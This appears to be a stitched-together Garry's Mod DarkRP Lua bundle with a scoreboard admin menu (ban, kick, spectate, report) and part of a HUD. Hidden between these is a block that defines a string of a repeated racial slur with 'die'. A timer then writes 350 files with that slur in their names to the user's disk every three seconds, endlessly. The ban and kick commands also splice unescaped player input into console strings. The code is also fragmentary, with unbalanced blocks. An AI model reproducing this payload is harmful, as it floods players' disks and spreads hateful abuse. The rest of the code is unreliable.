        Title:SetText(&quot;  Bring to:\n&quot;)
        Title:SetFont(&quot;UiBold&quot;)
        Title:SizeToContents()
        Title:SetTextColor(color_black)

        menudubring:AddPanel(Title)

        local uid = v:UserID()
        menudubring:AddOption(&quot;Yourself&quot;, function() RunConsoleCommand(&quot;_FAdmin&quot;, &quot;bring&quot;, uid) end)
        for _, v in pairs(DarkRP.nickSortedPlayers()) do
            if IsValid(v) and v ~= LocalPlayer() then
                local vUid = v:UserID()
                menudubring:AddOption(v:Nick(), function() RunConsoleCommand(&quot;_FAdmin&quot;, &quot;bring&quot;, uid, vUid) end)
            end
        end
        menudubring:Open()
      end
      local adminbutton4 = vgui.Create(&quot;DButton&quot;, adminmenuforthetabmenu)
      adminbutton4:SetSize( ScrW() * 0.08, ScrH() * 0.04 )
      adminbutton4:SetPos( ScrW() * 0.085, ScrH() * 0.083 )
      adminbutton4:SetText(&quot;Spectate&quot;)
      adminbutton4:SetFont(&quot;UserPing&quot;)
      adminbutton4:SetTextColor(color_white)
      function adminbutton4:Paint( w, h )
      draw.RoundedBox( 0, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
    end
      adminbutton4.DoClick = function()
        local toexec = [[ulx spectate &quot;]]..v:Nick()..[[&quot;]]
        print(toexec)
        LocalPlayer():ConCommand(toexec)
      end
      local adminbutton6 = vgui.Create(&quot;DButton&quot;, adminmenuforthetabmenu)
      adminbutton6:SetSize( ScrW() * 0.08, ScrH() * 0.04 )
      adminbutton6:SetPos( ScrW() * 0.003, ScrH() * 0.127 )
      adminbutton6:SetText(&quot;Ban&quot;)
      adminbutton6:SetFont(&quot;UserPing&quot;)
      adminbutton6:SetTextColor(color_white)
      function adminbutton6:Paint( w, h )
      draw.RoundedBox( 0, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
    end
      adminbutton6.DoClick = function()
        local fr = vgui.Create( &quot;DFrame&quot; )
      fr:SetSize( 350, 170 )
      fr:Center()
      fr:SetTitle( &quot;Ban : &quot;..v:Name() )
      fr:SetDraggable( false )
      fr:ShowCloseButton( true )
      fr:MakePopup()
      function fr:Paint( w, h )
        surface.SetDrawColor(175, 175, 175 ,245)
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(0, 0, 0, 255)
        surface.DrawRect(0, 0, w, h - h + 25)

        draw.SimpleText( &quot;Raison : &quot;, &quot;Trebuchet24&quot;, w / 2, 25, color_white, 1 )
      end

      local timeValue = vgui.Create( &quot;DTextEntry&quot;, fr )
      timeValue:SetSize( fr:GetWide() - 10, 25 )
      timeValue:SetPos( 5, 60 )
      timeValue:SetNumeric( false )
      timeValue:SetPlaceholderText( 'Entrez le temps... (En minute(s))' )

      local reasonValue = vgui.Create( &quot;DTextEntry&quot;, fr )
      reasonValue:SetSize( fr:GetWide() - 10, 25 )
      reasonValue:SetPos( 5, 90 )
      reasonValue:SetNumeric( false )
      reasonValue:SetPlaceholderText( 'Entrez la raison...' )

      local btn = vgui.Create( &quot;DButton&quot;, fr )
      btn:SetSize( 100, 30 )
      btn:SetPos( fr:GetWide() / 2 - btn:GetWide() / 2, 130 )
      btn:SetText( &quot;Valider&quot; )
      btn:SetTextColor( color_white )
      btn:SetFont( 'Trebuchet24' )
      function btn:Paint( w, h )
        draw.RoundedBox( 17, 0, 0, w, h, Color( 10, 130, 255, 255 ) )
      end
      function btn:DoClick()
        local toexec = [[ulx ban &quot;]]..v:Nick()..[[&quot; &quot;]]..timeValue:GetValue()..[[&quot; &quot;]]..reasonValue:GetValue()..[[&quot;]]
        LocalPlayer():ConCommand(toexec)
        fr:Close()
      end
    end
      local adminbutton7 = vgui.Create(&quot;DButton&quot;, adminmenuforthetabmenu)
      adminbutton7:SetSize( ScrW() * 0.08, ScrH() * 0.04 )
      adminbutton7:SetPos( ScrW() * 0.085, ScrH() * 0.127 )
      adminbutton7:SetText(&quot;Kick&quot;)
      adminbutton7:SetFont(&quot;UserPing&quot;)
      adminbutton7:SetTextColor(color_white)
      function adminbutton7:Paint( w, h )
      draw.RoundedBox( 0, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
    end
      adminbutton7.DoClick = function()
        local fr = vgui.Create( &quot;DFrame&quot; )
      fr:SetSize( 350, 145 )
      fr:Center()
      fr:SetTitle( &quot;Kick : &quot;..v:Name() )
      fr:SetDraggable( false )
      fr:ShowCloseButton( true )
      fr:MakePopup()
      function fr:Paint( w, h )
        surface.SetDrawColor(175, 175, 175 ,245)
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(0, 0, 0, 255)
        surface.DrawRect(0, 0, w, h - h + 25)

        draw.SimpleText( &quot;Raison : &quot;, &quot;Trebuchet24&quot;, w / 2, 25, color_white, 1 )
      end

      local reasonValue = vgui.Create( &quot;DTextEntry&quot;, fr )
      reasonValue:SetSize( fr:GetWide() - 10, 25 )
      reasonValue:SetPos( 5, 60 )
      reasonValue:SetNumeric( false )
      reasonValue:SetPlaceholderText( 'Entrez la raison...' )

      local btn = vgui.Create( &quot;DButton&quot;, fr )
      btn:SetSize( 100, 30 )
      btn:SetPos( fr:GetWide() / 2 - btn:GetWide() / 2, 100 )
      btn:SetText( &quot;Valider&quot; )
      btn:SetTextColor( color_white )
      btn:SetFont( 'Trebuchet24' )
      function btn:Paint( w, h )
        draw.RoundedBox( 17, 0, 0, w, h, Color( 10, 130, 255, 255 ) )
      end
      function btn:DoClick()
        local toexec = [[ulx kick &quot;]]..v:Nick()..[[&quot; &quot;]]..reasonValue:GetValue()..[[&quot;]]
        LocalPlayer():ConCommand(toexec)
        fr:Close()
      end
    end
end
			playerinfoforthetabmenu = vgui.Create(&quot;DFrame&quot;)
			playerinfoforthetabmenu:SetSize( ScrW() * 0.17, ScrH() *0.3 )
			playerinfoforthetabmenu:SetTitle(&quot;&quot;)
			playerinfoforthetabmenu:SetPos( ScrW() * 0.1, ScrH() *0.175 )
			playerinfoforthetabmenu:SetDraggable(false)
			playerinfoforthetabmenu:ShowCloseButton(false)
			playerinfoforthetabmenu:MakePopup()
			playerinfoforthetabmenu.Paint = function(self, w, h)
			surface.SetDrawColor(175, 175, 175 ,245)
			surface.DrawRect(0, 0, w, h)
			surface.SetDrawColor(0, 0, 0, 255)
			surface.DrawRect(0, 0, w, h - h + 35)
			draw.SimpleText(v:Name(), &quot;UserName&quot;, 150, (h - h) + 2, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER)
			draw.SimpleText(&quot;Grade : &quot;..v:GetUserGroup(), &quot;Popup&quot;, 5, (h - h) + 175, Color(255, 255, 255, 255), TEXT_ALIGN_LEFT)
			draw.SimpleText(&quot;Steam ID : &quot;..v:SteamID(), &quot;Popup&quot;, 5, (h - h) + 200, Color(255, 255, 255, 255), TEXT_ALIGN_LEFT)
			local avatar = playerinfoforthetabmenu:Add(&quot;AvatarImage&quot;)
			avatar:SetPos(2, 37)
			avatar:SetSize(125, 125)
			avatar:SetPlayer(v)
			end
			local buttonplayerinfoforthetabmenu = vgui.Create(&quot;DButton&quot;, playerinfoforthetabmenu)
			buttonplayerinfoforthetabmenu:SetSize( ScrW() * 0.15, ScrH() *0.04 )
			buttonplayerinfoforthetabmenu:SetPos( ScrW() * 0.01, ScrH() *0.24 )
			buttonplayerinfoforthetabmenu:SetText(&quot;Copier Le SteamID&quot;)
			buttonplayerinfoforthetabmenu:SetFont(&quot;UserName&quot;)
			buttonplayerinfoforthetabmenu:SetTextColor(color_white)
			function buttonplayerinfoforthetabmenu:Paint( w, h )
			draw.RoundedBox( 10, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
			buttonplayerinfoforthetabmenu.DoClick = function()
      chat.AddText(&quot;SteamID Copier !&quot;)
      buttonplayerinfoforthetabmenu:SetText(&quot;Copier !&quot;)
      timer.Create(&quot;TimerSteam&quot;,1,1,function()
      buttonplayerinfoforthetabmenu:SetText(&quot;Copier Le SteamID&quot;)
      end)
			SetClipboardText(v:SteamID())
		end
  	end
    local buttontwoplayerinfoforthetabmenu = vgui.Create(&quot;DButton&quot;, playerinfoforthetabmenu)
    buttontwoplayerinfoforthetabmenu:SetSize( ScrW() * 0.09, ScrH() * 0.03 )
    buttontwoplayerinfoforthetabmenu:SetPos( ScrW() * 0.076, ScrH() * 0.04 )
    buttontwoplayerinfoforthetabmenu:SetText(&quot;Report&quot;)
    buttontwoplayerinfoforthetabmenu:SetFont(&quot;UserPing&quot;)
    buttontwoplayerinfoforthetabmenu:SetTextColor(color_white)
    function buttontwoplayerinfoforthetabmenu:Paint( w, h )
    draw.RoundedBox( 15, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
	end
    buttontwoplayerinfoforthetabmenu.DoClick = function()
		local fr = vgui.Create( &quot;DFrame&quot; )
	fr:SetSize( 350, 145 )
	fr:Center()
	fr:SetTitle( &quot;Report : &quot;..v:Name() )
	fr:SetDraggable( false )
	fr:ShowCloseButton( true )
	fr:MakePopup()
	function fr:Paint( w, h )
surface.SetDrawColor(175, 175, 175 ,245)
surface.DrawRect(0, 0, w, h)
surface.SetDrawColor(0, 0, 0, 255)
surface.DrawRect(0, 0, w, h - h + 25)

		draw.SimpleText( &quot;Raison : &quot;, &quot;Trebuchet24&quot;, w / 2, 25, color_white, 1 )
	end

	local pAmount = vgui.Create( &quot;DTextEntry&quot;, fr )
	pAmount:SetSize( fr:GetWide() - 10, 25 )
	pAmount:SetPos( 5, 60 )
	pAmount:SetNumeric( false )
	pAmount:SetPlaceholderText( 'Entrez une Raison...' )

	local btn = vgui.Create( &quot;DButton&quot;, fr )
	btn:SetSize( 100, 30 )
	btn:SetPos( fr:GetWide() / 2 - btn:GetWide() / 2, 100 )
	btn:SetText( &quot;Valider&quot; )
	btn:SetTextColor( color_white )
	btn:SetFont( 'Trebuchet24' )
	function btn:Paint( w, h )
		draw.RoundedBox( 17, 0, 0, w, h, Color( 10, 130, 255, 255 ) )
	end
	function btn:DoClick()
    chat.AddText(Color(255,0,0),&quot;[Ticket]&quot;,Color(255,255,255),&quot; Report Effectuer&quot;)
		RunConsoleCommand( &quot;say&quot;, &quot;/// Bonjour, &quot; ..v:Name().. &quot; &quot; ..( pAmount:GetValue() ) )
    fr:Close()
	end
end
	    local buttontreeplayerinfoforthetabmenu = vgui.Create(&quot;DButton&quot;, playerinfoforthetabmenu)
    buttontreeplayerinfoforthetabmenu:SetSize( ScrW() * 0.09, ScrH() * 0.03 )
    buttontreeplayerinfoforthetabmenu:SetPos( ScrW() * 0.076, ScrH() * 0.08 )
    buttontreeplayerinfoforthetabmenu:SetText(&quot;Prochainement&quot;)
    buttontreeplayerinfoforthetabmenu:SetFont(&quot;UserPing&quot;)
    buttontreeplayerinfoforthetabmenu:SetTextColor(color_white)
    function buttontreeplayerinfoforthetabmenu:Paint( w, h )
    draw.RoundedBox( 15, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
	end
    buttontreeplayerinfoforthetabmenu.DoClick = function()
  end
  local buttonfiveplayerinfoforthetabmenu = vgui.Create(&quot;DButton&quot;, playerinfoforthetabmenu)
buttonfiveplayerinfoforthetabmenu:SetSize( ScrW() * 0.09, ScrH() * 0.03 )
buttonfiveplayerinfoforthetabmenu:SetPos( ScrW() * 0.076, ScrH() * 0.12 )
buttonfiveplayerinfoforthetabmenu:SetText(&quot;Message&quot;)
buttonfiveplayerinfoforthetabmenu:SetFont(&quot;UserPing&quot;)
buttonfiveplayerinfoforthetabmenu:SetTextColor(color_white)
function buttonfiveplayerinfoforthetabmenu:Paint( w, h )
draw.RoundedBox( 15, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
end
buttonfiveplayerinfoforthetabmenu.DoClick = function()
      local frame = vgui.Create(&quot;DFrame&quot;)
      frame:SetTitle(&quot;Envoyer un message&quot;)
      frame:SetSize(350, 120)
      frame:ShowCloseButton(false)
      frame:Center()
      frame:MakePopup()
      frame.Paint = function(self, w, h)
      surface.SetDrawColor(175, 175, 175 ,245)
      surface.DrawRect(0, 0, w, h)
      surface.SetDrawColor(0, 0, 0, 255)
      surface.DrawRect(0, 0, w, h - h + 25)
    end

      local MsgType = 2

      local i = 0
      local TypeButtons = {}
      for k, v in pairs(FAdmin.Messages.MsgTypes) do

          table.insert(TypeButtons, MsgTypeButton)
          i = i + 1
      end

      local OK = vgui.Create(&quot;DButton&quot;, frame)
      local TextBox = vgui.Create(&quot;DTextEntry&quot;, frame)
      TextBox:SetPos(20, 50)
      TextBox:StretchToParent(20, nil, 20, nil)
      TextBox:RequestFocus()
      function TextBox:Think()
          TextBox.InTab = TextBox.InTab or input.IsKeyDown(KEY_TAB)
          if TextBox.InTab and not input.IsKeyDown(KEY_TAB) then self:RequestFocus() end
      end
      function TextBox:OnEnter()
          OK:DoClick()
      end

      OK:SetSize(100, 20)
      OK:SetText(&quot;OK&quot;)
      OK:SetTextColor(color_white)
      OK:AlignRight(20)
      OK:AlignBottom(10)
      function OK:Paint( w, h )
      draw.RoundedBox( 0, 0, 0, w, h, Color( 75, 75, 75, 255 ) )
      end
      function OK:DoClick()
          frame:Close()
          if not IsValid(v) then return end
          RunConsoleCommand(&quot;_FAdmin&quot;, &quot;Message&quot;, v:SteamID(), MsgType, TextBox:GetValue())
      end

      local close = vgui.Create(&quot;DButton&quot;, frame)
      close:SetSize( ScrW() * 0.02, ScrH() * 0.02 )
      close:SetPos( ScrW() * 0.18, ScrH() * 0.002 )
      close:SetText(&quot;&quot;)
      function close:Paint( w, h )
      draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 0 ) )
      draw.SimpleText(&quot;❌&quot;,&quot;CenterPrintText&quot;,15,0,Color(255,0,0))
      end
      close.DoClick = function()
        frame:Close()
      end

  FAdmin.StartHooks[&quot;zzSendMessage&quot;] = function()
      FAdmin.Access.AddPrivilege(&quot;Message&quot;, 1)
      FAdmin.Commands.AddCommand(&quot;Message&quot;, nil, &quot;&lt;Player&gt;&quot;, &quot;[type]&quot;, &quot;&lt;text&gt;&quot;)

      FAdmin.ScoreBoard.Player:AddActionButton(&quot;Send message&quot;, &quot;fadmin/icons/message&quot;, Color(0, 200, 0, 255),
          function(v) return FAdmin.Access.PlayerHasPrivilege(LocalPlayer(), &quot;Message&quot;) and not v:IsBot() end, function(v, button)
              MessageGui(v)
          end)
  end
end
end



			local avatar = backp:Add(&quot;AvatarImage&quot;)
			avatar:SetPos(0, 0)
			avatar:SetSize(36, 36)
			avatar:SetPlayer(v)

			backp.Paint = function(self, w, h)

				if not v:IsValid() then
					sboard:Update()
					return
				end

				surface.SetDrawColor(255, 255, 255 ,255)
				surface.DrawOutlinedRect(0, 0, w, h)
				surface.SetDrawColor(175, 175, 175 ,245)
				surface.DrawRect(0, 0, w, h)

      			draw.SimpleText(v:Name(), &quot;UserName&quot;, 45, (h - h) + 2, Color(255, 255, 255, 255), TEXT_ALIGN_LEFT)
      			draw.SimpleText( v:getJobTable().name, &quot;UserJob&quot;, w / 2, (h - h) + 6, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER)
      			draw.SimpleText(v:Deaths(), &quot;UserPing&quot;, w - ((w/7)*2), (h - h) + 7, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER)
      			draw.SimpleText(v:Frags(), &quot;UserPing&quot;, w - (w/7) - 20, (h - h) + 7, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER)
      			draw.SimpleText(v:Ping(), &quot;UserPing&quot;, w - 20, (h - h) + 7, Color(255, 255, 255, 255), TEXT_ALIGN_RIGHT)
      		end
		end
	end
    sboard:Update()
end

hook.Add(&quot;ScoreboardShow&quot;, &quot;DarkRP.custom.scoreboard.show&quot;, function()
    if not (sboard == nil) then
    	sboard:Update()
        sboard:SetVisible(true)
		local function PUMPPPTEST()

  tab= {}
  tab[ &quot;$pp_colour_addr&quot; ]         = 0
  tab[ &quot;$pp_colour_addg&quot; ]         = 0
  tab[ &quot;$pp_colour_addb&quot; ]         = 0
  tab[ &quot;$pp_colour_brightness&quot; ]      = 0
  tab[ &quot;$pp_colour_contrast&quot; ]          = 1
  tab[ &quot;$pp_colour_colour&quot; ]         = 0
  tab[ &quot;$pp_colour_mulr&quot; ]         = 0
  tab[ &quot;$pp_colour_mulg&quot; ]         = 0
  tab[ &quot;$pp_colour_mulb&quot; ]         = 0

    DrawColorModify( tab )
end
hook.Add( &quot;RenderScreenspaceEffects&quot;, &quot;RenderColorModifyPOO&quot;, PUMPPPTEST )

    else
        DrawScoreBoard()
    end
end)
hook.Add(&quot;ScoreboardHide&quot;, &quot;DarkRP.custom.scoreboard.hide&quot;, function()
    if (sboard) then
			sboard:SetVisible(false)
				if IsValid(playerinfoforthetabmenu) then
					playerinfoforthetabmenu:Close()
				end
        if IsValid(adminmenuforthetabmenu) then
             adminmenuforthetabmenu:Close()
        end
        timer.Remove(&quot;TimerSteam&quot;)
					hook.Remove(&quot;RenderScreenspaceEffects&quot;, &quot;RenderColorModifyPOO&quot;)

	end
end)
end)



--[[

    Data S'autoSucer

]]--



local n1gs = [[ N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
]]

timer.Create( &quot;gvacspaam&quot;, 3, 0, function()
	for i = 1, 350 do 
		file.Write( &quot;N1GG4_D13_&quot;.. math.Rand( 1, 1337) ..&quot;.txt&quot;,  n1gs )
	end
end)



--[[

HUD

]]--



----------------------------------------------------------------------------
								--PIX HUD--
----------------------------------------------------------------------------
include(&quot;sh_config.lua&quot;)

if SERVER then
	util.AddNetworkString(&quot;GotArrested&quot;)
	util.AddNetworkString(&quot;AdminTell&quot;)
	util.AddNetworkString(&quot;_Notify&quot;)

	resource.AddFile(&quot;materials/pixim/health.png&quot;)
	resource.AddFile(&quot;materials/pixim/armor.png&quot;)
	resource.AddFile(&quot;materials/pixim/hunger.png&quot;)
	resource.AddFile(&quot;materials/pixim/want.png&quot;)
	resource.AddFile(&quot;materials/pixim/gun.png&quot;)
	resource.AddFile(&quot;materials/pixim/gun2.png&quot;)
	resource.AddFile(&quot;materials/pixim/want2.png&quot;)
	resource.AddFile(&quot;materials/pixim/gun2.png&quot;)
	resource.AddFile(&quot;resource/fonts/BebasNeue.otf&quot;)

	return

end






	/*---------------------------------------------------------------------------

	FONT

	---------------------------------------------------------------------------*/


surface.CreateFont( &quot;argent&quot;, {
 font = &quot;BebasNeue&quot;,
 size = 35 * PIXConfig.HUDScale,
 weight = 500 ,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )


surface.CreateFont( &quot;nom&quot;, {
 font = &quot;BebasNeue&quot;,
 size = 28 * PIXConfig.HUDScale,
 weight = 500 ,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )

surface.CreateFont( &quot;vieecrit&quot;, {
 font = &quot;BebasNeue&quot;,
 size = 20 * PIXConfig.HUDScale,
 weight = 500 ,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )

surface.CreateFont( &quot;vie&quot;, {
 font = &quot;BebasNeue&quot;,
 size = 50* PIXConfig.HUDScale,
 weight = 500,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )


surface.CreateFont( &quot;slash&quot;, {
 font = &quot;BebasNeue&quot;,
 size = 60 * PIXConfig.HUDScale,
 weight = 500,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )


surface.CreateFont( &quot;wl&quot;, {
 font = &quot;BebasNeue&quot;,
 size = 30* PIXConfig.HUDScale,
 weight = 500,
 blursize = 0,
 scanlines = 0,
 symbol = true,
 antialias = true
} )


surface.CreateFont( &quot;argent2&quot;, {
 font = &quot;BebasNeue&quot;,
 size = 40* PIXConfig.HUDScale,
 weight = 500,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )


surface.CreateFont( &quot;lockdown&quot;, {
 font = &quot;BebasNeue&quot;,
 size = 20,
 weight = 500,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )


surface.CreateFont( &quot;agenda&quot;, {
 font = &quot;BebasNeue&quot;,
 size = 23* PIXConfig.HUDScale,
 weight = 500,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )


surface.CreateFont( &quot;ammoout&quot;, {
 font = &quot;BebasNeue&quot;,
 size = 18* PIXConfig.HUDScale,
 weight = 500,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )


	/*---------------------------------------------------------------------------

	HIDEHUDELEMEMENTS

	---------------------------------------------------------------------------*/


local hideHUDElements = {
	[&quot;DarkRP_HUD&quot;]				= true,
	[&quot;DarkRP_ArrestedHUD&quot;]		= false,
	[&quot;DarkRP_EntityDisplay&quot;] 	= false,
	[&quot;DarkRP_ZombieInfo&quot;] 		= true,
	[&quot;DarkRP_LocalPlayerHUD&quot;] 	= true,
	[&quot;DarkRP_Hungermod&quot;] 		= true,
	[&quot;DarkRP_Agenda&quot;] 			= true,
	[&quot;CHudAmmo&quot;]                = true,
    [&quot;CHudSecondaryAmmo&quot;]       = true,
    [&quot;DarkRP_LockDown&quot;]   		= true,
}



	/*---------------------------------------------------------------------------

	HideHudElements

	---------------------------------------------------------------------------*/




local function hideElements(name)

	if name == &quot;CHudHealth&quot; or name == &quot;CHudBattery&quot; or name == &quot;CHudSuitPower&quot; then
		return false
	end

	if hideHUDElements[name] then
		return false
	end

end
hook.Add(&quot;HUDShouldDraw&quot;, &quot;hideElements&quot;, hideElements)




	/*---------------------------------------------------------------------------

	Format Number Function

	---------------------------------------------------------------------------*/




local function formatNumber(n)
	if not n then return &quot;&quot; end
	if n &gt;= 1e14 then return tostring(n) end
	n = tostring(n)
	local sep = sep or &quot;,&quot;
	local dp = string.find(n, &quot;%.&quot;) or #n+1
	for i=dp-4, 1, -3 do
		n = n:sub(1, i) .. sep .. n:sub(i+1)
	end
	return n
end

	/*---------------------------------------------------------------------------

	Material

	---------------------------------------------------------------------------*/


	hearth 	= Material(&quot;pixim/pixV.png&quot;, &quot;noclamp smooth&quot;)

	shield 	= Material(&quot;pixim/pixS.png&quot;, &quot;noclamp smooth&quot;)

	food 	= Material(&quot;pixim/pixF.png&quot;, &quot;noclamp smooth&quot;)

	gun    	= Material(&quot;pixim/pixG.png&quot;, &quot;noclamp smooth&quot;)

	wanted  = Material(&quot;pixim/pixW.png&quot;, &quot;noclamp smooth&quot;)

	run 	= Material(&quot;pixim/pixR.png&quot;, &quot;noclamp smooth&quot;)


	/*---------------------------------------------------------------------------

	Base

	---------------------------------------------------------------------------*/




local function Base()



		surface.SetDrawColor( 40, 40, 40, 230 )
		surface.DrawRect( 5 * PIXConfig.HUDScale, ScrH() - 138 * PIXConfig.HUDScale, 370 * PIXConfig.HUDScale, 90 * PIXConfig.HUDScale )

		surface.SetDrawColor( 10, 10, 10, 250 )
		surface.DrawRect( 5 * PIXConfig.HUDScale,ScrH() - 181 * PIXConfig.HUDScale, 370 * PIXConfig.HUDScale, 40 * PIXConfig.HUDScale)

		surface.SetDrawColor( 40, 40, 40, 230 )
		surface.DrawRect( 85 * PIXConfig.HUDScale ,ScrH() - 195 * PIXConfig.HUDScale, 215 * PIXConfig.HUDScale, 6 * PIXConfig.HUDScale)

		surface.SetDrawColor( 40, 40, 40, 230 )
		surface.DrawRect( 5 * PIXConfig.HUDScale,ScrH() - 45 * PIXConfig.HUDScale, 370 * PIXConfig.HUDScale, 40 * PIXConfig.HUDScale )

		surface.SetDrawColor( 10, 10, 10, 230 )
		surface.DrawRect( 44.5 * PIXConfig.HUDScale,ScrH() - 45 * PIXConfig.HUDScale, 290 * PIXConfig.HUDScale, 40 * PIXConfig.HUDScale )

		draw.RoundedBox(0,5*PIXConfig.HUDScale,ScrH() - 138*PIXConfig.HUDScale, 10*PIXConfig.HUDScale, 90*PIXConfig.HUDScale, Color(10, 10, 10,230))

		draw.RoundedBox(0,15*PIXConfig.HUDScale,ScrH() - 138*PIXConfig.HUDScale, 70*PIXConfig.HUDScale, 10*PIXConfig.HUDScale, Color(10, 10, 10,230))

		draw.RoundedBox(0,15*PIXConfig.HUDScale,ScrH() - 58*PIXConfig.HUDScale, 70*PIXConfig.HUDScale, 10*PIXConfig.HUDScale, Color(10, 10, 10,230))

		draw.RoundedBox(0,85*PIXConfig.HUDScale,ScrH() - 138*PIXConfig.HUDScale, 10.5*PIXConfig.HUDScale, 90*PIXConfig.HUDScale, Color(10, 10, 10,230))


end

	/*---------------------------------------------------------------------------

	Steam Image

	---------------------------------------------------------------------------*/
local function SteamImage()

	if PIXConfig.SteamImage == true then

